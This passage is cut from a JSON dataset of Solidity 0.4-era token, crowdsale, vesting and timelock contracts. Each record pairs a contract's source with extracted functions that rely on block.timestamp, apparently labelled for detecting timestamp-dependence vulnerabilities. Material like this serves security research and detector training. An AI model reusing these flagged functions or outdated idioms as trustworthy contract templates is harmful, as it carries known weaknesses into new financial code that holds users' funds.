uint256 _value) public whenNotPaused returns (bool) {\n return super.approve(_spender, _value);\n }\n function increaseApproval(address _spender, uint _addedValue) public whenNotPaused returns (bool success) {\n return super.increaseApproval(_spender, _addedValue);\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public whenNotPaused returns (bool success) {\n return super.decreaseApproval(_spender, _subtractedValue);\n }\n}\ncontract VreoToken is CappedToken, PausableToken, BurnableToken {\n uint public constant TOTAL_TOKEN_CAP = 700000000e18;\n string public name = \"MERO Token\";\n string public symbol = \"MERO\";\n uint8 public decimals = 18;\n constructor() public CappedToken(TOTAL_TOKEN_CAP) {\n pause();\n }\n}\ncontract VreoTokenSale is PostKYCCrowdsale, FinalizableCrowdsale, MintedCrowdsale {\n uint public constant TOTAL_TOKEN_CAP_OF_SALE = 450000000e18;\n uint public constant TOKEN_SHARE_OF_TEAM = 85000000e18;\n uint public constant TOKEN_SHARE_OF_ADVISORS = 58000000e18;\n uint public constant TOKEN_SHARE_OF_LEGALS = 57000000e18;\n uint public constant TOKEN_SHARE_OF_BOUNTY = 50000000e18;\n uint public constant BONUS_PCT_IN_ICONIQ_SALE = 30;\n uint public constant BONUS_PCT_IN_VREO_SALE_PHASE_1 = 20;\n uint public constant BONUS_PCT_IN_VREO_SALE_PHASE_2 = 10;\n uint public constant ICONIQ_SALE_OPENING_TIME = 1531123200;\n uint public constant ICONIQ_SALE_CLOSING_TIME = 1532376000;\n uint public constant VREO_SALE_OPENING_TIME = 1533369600;\n uint public constant VREO_SALE_PHASE_1_END_TIME = 1533672000;\n uint public constant VREO_SALE_PHASE_2_END_TIME = 1534276800;\n uint public constant VREO_SALE_CLOSING_TIME = 1535832000;\n uint public constant KYC_VERIFICATION_END_TIME = 1537041600;\n uint public constant ICONIQ_TOKENS_NEEDED_PER_INVESTED_WEI = 450;\n ERC20Basic public iconiqToken;\n address public teamAddress;\n address public advisorsAddress;\n address public legalsAddress;\n address public bountyAddress;\n uint public remainingTokensForSale;\n event RateChanged(uint newRate);\n constructor(\n VreoToken _token,\n uint _rate,\n ERC20Basic _iconiqToken,\n address _teamAddress,\n address _advisorsAddress,\n address _legalsAddress,\n address _bountyAddress,\n address _wallet\n )\n public\n Crowdsale(_rate, _wallet, _token)\n TimedCrowdsale(ICONIQ_SALE_OPENING_TIME, VREO_SALE_CLOSING_TIME)\n {\n require(_token.cap() >= TOTAL_TOKEN_CAP_OF_SALE\n + TOKEN_SHARE_OF_TEAM\n + TOKEN_SHARE_OF_ADVISORS\n + TOKEN_SHARE_OF_LEGALS\n + TOKEN_SHARE_OF_BOUNTY);\n require(address(_iconiqToken) != address(0)\n && _teamAddress != address(0)\n && _advisorsAddress != address(0)\n && _legalsAddress != address(0)\n && _bountyAddress != address(0));\n iconiqToken = _iconiqToken;\n teamAddress = _teamAddress;\n advisorsAddress = _advisorsAddress;\n legalsAddress = _legalsAddress;\n bountyAddress = _bountyAddress;\n remainingTokensForSale = TOTAL_TOKEN_CAP_OF_SALE;\n }\n function distributePresale(address[] _investors, uint[] _amounts) public onlyOwner {\n require(!hasClosed());\n require(_investors.length == _amounts.length);\n uint totalAmount = 0;\n for (uint i = 0; i < _investors.length; ++i) {\n VreoToken(token).mint(_investors[i], _amounts[i]);\n totalAmount = totalAmount.add(_amounts[i]);\n }\n require(remainingTokensForSale >= totalAmount);\n remainingTokensForSale = remainingTokensForSale.sub(totalAmount);\n }\n function setRate(uint _newRate) public onlyOwner {\n require(rate / 10 < _newRate && _newRate < 10 * rate);\n rate = _newRate;\n emit RateChanged(_newRate);\n }\n function withdrawInvestment() public {\n require(hasClosed());\n super.withdrawInvestment();\n }\n function iconiqSaleOngoing() public view returns (bool) {\n return ICONIQ_SALE_OPENING_TIME <= now && now <= ICONIQ_SALE_CLOSING_TIME;\n }\n function vreoSaleOngoing() public view returns (bool) {\n return VREO_SALE_OPENING_TIME <= now && now <= VREO_SALE_CLOSING_TIME;\n }\n function getIconiqMaxInvestment(address _investor) public view returns (uint) {\n uint iconiqBalance = iconiqToken.balanceOf(_investor);\n uint prorataLimit = iconiqBalance.div(ICONIQ_TOKENS_NEEDED_PER_INVESTED_WEI);\n require(prorataLimit >= investments[_investor].totalWeiInvested);\n return prorataLimit.sub(investments[_investor].totalWeiInvested);\n }\n function _preValidatePurchase(address _beneficiary, uint _weiAmount) internal {\n super._preValidatePurchase(_beneficiary, _weiAmount);\n require(iconiqSaleOngoing() && getIconiqMaxInvestment(msg.sender) >= _weiAmount || vreoSaleOngoing());\n }\n function _getTokenAmount(uint _weiAmount) internal view returns (uint) {\n uint tokenAmount = super._getTokenAmount(_weiAmount);\n if (now <= ICONIQ_SALE_CLOSING_TIME) {\n return tokenAmount.mul(100 + BONUS_PCT_IN_ICONIQ_SALE).div(100);\n }\n if (now <= VREO_SALE_PHASE_1_END_TIME) {\n return tokenAmount.mul(100 + BONUS_PCT_IN_VREO_SALE_PHASE_1).div(100);\n }\n if (now <= VREO_SALE_PHASE_2_END_TIME) {\n return tokenAmount.mul(100 + BONUS_PCT_IN_VREO_SALE_PHASE_2).div(100);\n }\n return tokenAmount;\n }\n function _deliverTokens(address _beneficiary, uint _tokenAmount) internal {\n require(remainingTokensForSale >= _tokenAmount);\n remainingTokensForSale = remainingTokensForSale.sub(_tokenAmount);\n super._deliverTokens(_beneficiary, _tokenAmount);\n }\n function finalization() internal {\n require(now >= KYC_VERIFICATION_END_TIME);\n VreoToken(token).mint(teamAddress, TOKEN_SHARE_OF_TEAM);\n VreoToken(token).mint(advisorsAddress, TOKEN_SHARE_OF_ADVISORS);\n VreoToken(token).mint(legalsAddress, TOKEN_SHARE_OF_LEGALS);\n VreoToken(token).mint(bountyAddress, TOKEN_SHARE_OF_BOUNTY);\n VreoToken(token).finishMinting();\n VreoToken(token).unpause();\n super.finalization();\n }\n}",
  "extract_feature": [
    "function TimedCrowdsale(uint256 _openingTime, uint256 _closingTime) public {\nrequire(_openingTime >= block.timestamp);\nrequire(_closingTime >= _openingTime);\nopeningTime = _openingTime;\nclosingTime = _closingTime;\n}",
    "function hasClosed() public view returns (bool) {\nreturn block.timestamp > closingTime;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f1d"
  },
  "filename": "665.sol",
  "content": "pragma solidity 0.4.24;\ncontract ERC20TokenInterface {\n function totalSupply () external constant returns (uint);\n function balanceOf (address tokenOwner) external constant returns (uint balance);\n function transfer (address to, uint tokens) external returns (bool success);\n function transferFrom (address from, address to, uint tokens) external returns (bool success);\n}\nlibrary SafeMath {\n function mul (uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n require(c / a == b);\n return c;\n }\n function div (uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub (uint256 a, uint256 b) internal pure returns (uint256) {\n require(b <= a);\n return a - b;\n }\n function add (uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n require(c >= a);\n return c;\n }\n}\ncontract TwoYearDreamTokensVesting {\n using SafeMath for uint256;\n ERC20TokenInterface public dreamToken;\n address public withdrawalAddress = 0x0;\n struct VestingStage {\n uint256 date;\n uint256 tokensUnlockedPercentage;\n }\n VestingStage[4] public stages;\n uint256 public initialTokensBalance;\n uint256 public tokensSent;\n uint256 public vestingStartUnixTimestamp;\n address public deployer;\n modifier deployerOnly { require(msg.sender == deployer); _; }\n modifier whenInitialized { require(withdrawalAddress != 0x0); _; }\n modifier whenNotInitialized { require(withdrawalAddress == 0x0); _; }\n event Withdraw(uint256 amount, uint256 timestamp);\n constructor (ERC20TokenInterface token) public {\n dreamToken = token;\n deployer = msg.sender;\n }\n function () external {\n withdrawTokens();\n }\n function initializeVestingFor (address account) external deployerOnly whenNotInitialized {\n initialTokensBalance = dreamToken.balanceOf(this);\n require(initialTokensBalance != 0);\n withdrawalAddress = account;\n vestingStartUnixTimestamp = block.timestamp;\n vestingRules();\n }\n function getAvailableTokensToWithdraw () public view returns (uint256) {\n uint256 tokensUnlockedPercentage = getTokensUnlockedPercentage();\n if (tokensUnlockedPercentage >= 100) {\n return dreamToken.balanceOf(this);\n } else {\n return getTokensAmountAllowedToWithdraw(tokensUnlockedPercentage);\n }\n }\n function vestingRules () internal {\n uint256 halfOfYear = 183 days;\n uint256 year = halfOfYear * 2;\n stages[0].date = vestingStartUnixTimestamp + halfOfYear;\n stages[1].date = vestingStartUnixTimestamp + year;\n stages[2].date = vestingStartUnixTimestamp + year + halfOfYear;\n stages[3].date = vestingStartUnixTimestamp + (year * 2);\n stages[0].tokensUnlockedPercentage = 25;\n stages[1].tokensUnlockedPercentage = 50;\n stages[2].tokensUnlockedPercentage = 75;\n stages[3].tokensUnlockedPercentage = 100;\n }\n function withdrawTokens () private whenInitialized {\n uint256 tokensToSend = getAvailableTokensToWithdraw();\n sendTokens(tokensToSend);\n if (dreamToken.balanceOf(this) == 0) {\n selfdestruct(withdrawalAddress);\n }\n }\n function sendTokens (uint256 tokensToSend) private {\n if (tokensToSend == 0) {\n return;\n }\n tokensSent = tokensSent.add(tokensToSend);\n dreamToken.transfer(withdrawalAddress, tokensToSend);\n emit Withdraw(tokensToSend, now);\n }\n function getTokensAmountAllowedToWithdraw (uint256 tokensUnlockedPercentage) private view returns (uint256) {\n uint256 totalTokensAllowedToWithdraw = initialTokensBalance.mul(tokensUnlockedPercentage).div(100);\n uint256 unsentTokensAmount = totalTokensAllowedToWithdraw.sub(tokensSent);\n return unsentTokensAmount;\n }\n function getTokensUnlockedPercentage () private view returns (uint256) {\n uint256 allowedPercent;\n for (uint8 i = 0; i < stages.length; i++) {\n if (now >= stages[i].date) {\n allowedPercent = stages[i].tokensUnlockedPercentage;\n }\n }\n return allowedPercent;\n }\n}",
  "extract_feature": [
    "function initializeVestingFor (address account) external deployerOnly whenNotInitialized {\ninitialTokensBalance = dreamToken.balanceOf(this);\nrequire(initialTokensBalance != 0);\nwithdrawalAddress = account;\nvestingStartUnixTimestamp = block.timestamp;\nvestingRules();\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f1e"
  },
  "filename": "6663.sol",
  "content": "pragma solidity ^0.4.23;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}\ncontract TokenTimelockController is Ownable {\n using SafeMath for uint;\n struct TokenTimelock {\n uint256 amount;\n uint256 releaseTime;\n bool released;\n bool revocable;\n bool revoked;\n }\n event TokenTimelockCreated(\n address indexed beneficiary,\n uint256 releaseTime,\n bool revocable,\n uint256 amount\n );\n event TokenTimelockRevoked(\n address indexed beneficiary\n );\n event TokenTimelockBeneficiaryChanged(\n address indexed previousBeneficiary,\n address indexed newBeneficiary\n );\n event TokenTimelockReleased(\n address indexed beneficiary,\n uint256 amount\n );\n uint256 public constant TEAM_LOCK_DURATION_PART1 = 1 * 365 days;\n uint256 public constant TEAM_LOCK_DURATION_PART2 = 2 * 365 days;\n uint256 public constant INVESTOR_LOCK_DURATION = 1 hours;\n mapping (address => TokenTimelock[]) tokenTimeLocks;\n ERC20 public token;\n address public crowdsale;\n bool public activated;\n constructor(ERC20 _token) public {\n token = _token;\n }\n modifier onlyCrowdsale() {\n require(msg.sender == crowdsale);\n _;\n }\n modifier onlyWhenActivated() {\n require(activated);\n _;\n }\n modifier onlyValidTokenTimelock(address _beneficiary, uint256 _id) {\n require(_beneficiary != address(0));\n require(_id < tokenTimeLocks[_beneficiary].length);\n require(!tokenTimeLocks[_beneficiary][_id].revoked);\n _;\n }\n function setCrowdsale(address _crowdsale) external onlyOwner {\n require(_crowdsale != address(0));\n crowdsale = _crowdsale;\n }\n function activate() external onlyCrowdsale {\n activated = true;\n }\n function createInvestorTokenTimeLock(\n address _beneficiary,\n uint256 _amount,\n uint256 _start,\n address _tokenHolder\n ) external onlyCrowdsale returns (bool)\n {\n require(_beneficiary != address(0) && _amount > 0);\n require(_tokenHolder != address(0));\n TokenTimelock memory tokenLock = TokenTimelock(\n _amount,\n _start.add(INVESTOR_LOCK_DURATION),\n false,\n false,\n false\n );\n tokenTimeLocks[_beneficiary].push(tokenLock);\n require(token.transferFrom(_tokenHolder, this, _amount));\n emit TokenTimelockCreated(\n _beneficiary,\n tokenLock.releaseTime,\n false,\n _amount);\n return true;\n }\n function createTeamTokenTimeLock(\n address _beneficiary,\n uint256 _amount,\n uint256 _start,\n address _tokenHolder\n ) external onlyOwner returns (bool)\n {\n require(_beneficiary != address(0) && _amount > 0);\n require(_tokenHolder != address(0));\n uint256 amount = _amount.div(2);\n TokenTimelock memory tokenLock1 = TokenTimelock(\n amount,\n _start.add(TEAM_LOCK_DURATION_PART1),\n false,\n true,\n false\n );\n tokenTimeLocks[_beneficiary].push(tokenLock1);\n TokenTimelock memory tokenLock2 = TokenTimelock(\n amount,\n _start.add(TEAM_LOCK_DURATION_PART2),\n false,\n true,\n false\n );\n tokenTimeLocks[_beneficiary].push(tokenLock2);\n require(token.transferFrom(_tokenHolder, this, _amount));\n emit TokenTimelockCreated(\n _beneficiary,\n tokenLock1.releaseTime,\n true,\n amount);\n emit TokenTimelockCreated(\n _beneficiary,\n tokenLock2.releaseTime,\n true,\n amount);\n return true;\n }\n function revokeTokenTimelock(\n address _beneficiary,\n uint256 _id)\n external onlyWhenActivated onlyOwner onlyValidTokenTimelock(_beneficiary, _id)\n {\n require(tokenTimeLocks[_beneficiary][_id].revocable);\n require(!tokenTimeLocks[_beneficiary][_id].released);\n TokenTimelock storage tokenLock = tokenTimeLocks[_beneficiary][_id];\n tokenLock.revoked = true;\n require(token.transfer(owner, tokenLock.amount));\n emit TokenTimelockRevoked(_beneficiary);\n }\n function getTokenTimelockCount(address _beneficiary) view external returns (uint) {\n return tokenTimeLocks[_beneficiary].length;\n }\n function getTokenTimelockDetails(address _beneficiary, uint256 _id) view external returns (\n uint256 _amount,\n uint256 _releaseTime,\n bool _released,\n bool _revocable,\n bool _revoked)\n {\n require(_id < tokenTimeLocks[_beneficiary].length);\n _amount = tokenTimeLocks[_beneficiary][_id].amount;\n _releaseTime = tokenTimeLocks[_beneficiary][_id].releaseTime;\n _released = tokenTimeLocks[_beneficiary][_id].released;\n _revocable = tokenTimeLocks[_beneficiary][_id].revocable;\n _revoked = tokenTimeLocks[_beneficiary][_id].revoked;\n }\n function changeBeneficiary(uint256 _id, address _newBeneficiary) external onlyWhenActivated onlyValidTokenTimelock(msg.sender, _id) {\n tokenTimeLocks[_newBeneficiary].push(tokenTimeLocks[msg.sender][_id]);\n if (tokenTimeLocks[msg.sender].length > 1) {\n tokenTimeLocks[msg.sender][_id] = tokenTimeLocks[msg.sender][tokenTimeLocks[msg.sender].length.sub(1)];\n delete(tokenTimeLocks[msg.sender][tokenTimeLocks[msg.sender].length.sub(1)]);\n }\n tokenTimeLocks[msg.sender].length--;\n emit TokenTimelockBeneficiaryChanged(msg.sender, _newBeneficiary);\n }\n function release(uint256 _id) external {\n releaseFor(msg.sender, _id);\n }\n function releaseFor(address _beneficiary, uint256 _id) public onlyWhenActivated onlyValidTokenTimelock(_beneficiary, _id) {\n TokenTimelock storage tokenLock = tokenTimeLocks[_beneficiary][_id];\n require(!tokenLock.released);\n require(block.timestamp >= tokenLock.releaseTime);\n tokenLock.released = true;\n require(token.transfer(_beneficiary, tokenLock.amount));\n emit TokenTimelockReleased(_beneficiary, tokenLock.amount);\n }\n}",
  "extract_feature": [
    "function releaseFor(address _beneficiary, uint256 _id) public onlyWhenActivated onlyValidTokenTimelock(_beneficiary, _id) {\nTokenTimelock storage tokenLock = tokenTimeLocks[_beneficiary][_id];\nrequire(!tokenLock.released);\nrequire(block.timestamp >= tokenLock.releaseTime);\ntokenLock.released = true;\nrequire(token.transfer(_beneficiary, tokenLock.amount));\nemit TokenTimelockReleased(_beneficiary, tokenLock.amount);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f1f"
  },
  "filename": "6743.sol",
  "content": "pragma solidity ^0.4.13;\ncontract FinalizeAgent {\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function finalizeCrowdsale();\n}\ncontract PricingStrategy {\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\nlibrary SafeMathLib {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract Recoverable is Ownable {\n function Recoverable() {\n }\n function recoverTokens(ERC20Basic token) onlyOwner public {\n token.transfer(owner, tokensToBeReturned(token));\n }\n function tokensToBeReturned(ERC20Basic token) public returns (uint) {\n return token.balanceOf(this);\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract Whitelist is Ownable {\n mapping(address => bool) public whitelist;\n event WhitelistedAddressAdded(address addr);\n event WhitelistedAddressRemoved(address addr);\n modifier onlyWhitelisted() {\n require(whitelist[msg.sender]);\n _;\n }\n function addAddressToWhitelist(address addr) onlyOwner public returns(bool success) {\n if (!whitelist[addr]) {\n whitelist[addr] = true;\n WhitelistedAddressAdded(addr);\n success = true;\n }\n }\n function addAddressesToWhitelist(address[] addrs) onlyOwner public returns(bool success) {\n for (uint256 i = 0; i < addrs.length; i++) {\n if (addAddressToWhitelist(addrs[i])) {\n success = true;\n }\n }\n }\n function removeAddressFromWhitelist(address addr) onlyOwner public returns(bool success) {\n if (whitelist[addr]) {\n whitelist[addr] = false;\n WhitelistedAddressRemoved(addr);\n success = true;\n }\n }\n function removeAddressesFromWhitelist(address[] addrs) onlyOwner public returns(bool success) {\n for (uint256 i = 0; i < addrs.length; i++) {\n if (removeAddressFromWhitelist(addrs[i])) {\n success = true;\n }\n }\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20 is ERC20 {\n uint public decimals;\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract CrowdsaleBase is Haltable, Whitelist {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLib for uint;\n FractionalERC20 public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public presaleWeiRaised = 0;\n uint public investorCount = 0;\n uint public loadedRefund = 0;\n uint public weiRefunded = 0;\n bool public finalized;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n mapping (address => bool) public earlyParticipantWhitelist;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized, Refunding}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Refund(address investor, uint weiAmount);\n event InvestmentPolicyChanged(bool newRequireCustomerId, bool newRequiredSignedAddress, address newSignerAddress);\n event Whitelisted(address addr, bool status);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleBase(address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal) {\n owner = msg.sender;\n token = FractionalERC20(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency internal returns(uint tokensBought) {\n Whitelist dc;\n address contract_addr = 0x062e41d1037745dc203e8c1AAcA651B8d157Da96;\n dc = Whitelist(contract_addr);\n require (dc.whitelist(msg.sender));\n require (dc.whitelist(receiver));\n if(getState() == State.PreFunding) {\n if(!earlyParticipantWhitelist[receiver]) {\n throw;\n }\n } else if(getState() == State.Funding) {\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n require(weiAmount >= minimumFundingGoal);\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised - presaleWeiRaised, tokensSold, msg.sender, token.decimals());\n require(tokenAmount != 0);\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(pricingStrategy.isPresalePurchase(receiver)) {\n presaleWeiRaised = presaleWeiRaised.plus(weiAmount);\n }\n require(!isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold));\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n return tokenAmount;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != 0) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) onlyOwner {\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEndsAt(uint time) onlyOwner {\n if(now > time) {\n throw;\n }\n if(startsAt > time) {\n throw;\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) onlyOwner {\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function loadRefund() public payable inState(State.Failure) {\n if(msg.value == 0) throw;\n loadedRefund = loadedRefund.plus(msg.value);\n }\n function refund() public inState(State.Refunding) {\n uint256 weiValue = investedAmountOf[msg.sender];\n if (weiValue == 0) throw;\n investedAmountOf[msg.sender] = 0;\n weiRefunded = weiRefunded.plus(weiValue);\n Refund(msg.sender, weiValue);\n if (!msg.sender.send(weiValue)) throw;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else if (!isMinimumGoalReached() && weiRaised > 0 && loadedRefund >= weiRaised) return State.Refunding;\n else return State.Failure;\n }\n function setOwnerTestValue(uint val) onlyOwner {\n ownerTestValue = val;\n }\n function setEarlyParicipantWhitelist(address addr, bool status) onlyOwner {\n earlyParticipantWhitelist[addr] = status;\n Whitelisted(addr, status);\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) internal;\n}\ncontract Crowdsale is CrowdsaleBase {\n bool public requireCustomerId;\n bool public requiredSignedAddress;\n address public signerAddress;\n function Crowdsale(address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal) CrowdsaleBase(_token, _pricingStrategy, _multisigWallet, _start, _end, _minimumFundingGoal) {\n }\n function preallocate(address receiver, uint fullTokens, uint weiPrice) public onlyOwner {\n uint tokenAmount = fullTokens * 10**token.decimals();\n uint weiAmount = weiPrice * fullTokens;\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n assignTokens(receiver, tokenAmount);\n Invested(receiver, weiAmount, tokenAmount, 0);\n }\n function investWithSignedAddress(address addr, uint128 customerId, uint8 v, bytes32 r, bytes32 s) public payable {\n bytes32 hash = sha256(addr);\n if (ecrecover(hash, v, r, s) != signerAddress) throw;\n if(customerId == 0) throw;\n investInternal(addr, customerId);\n }\n function investWithCustomerId(address 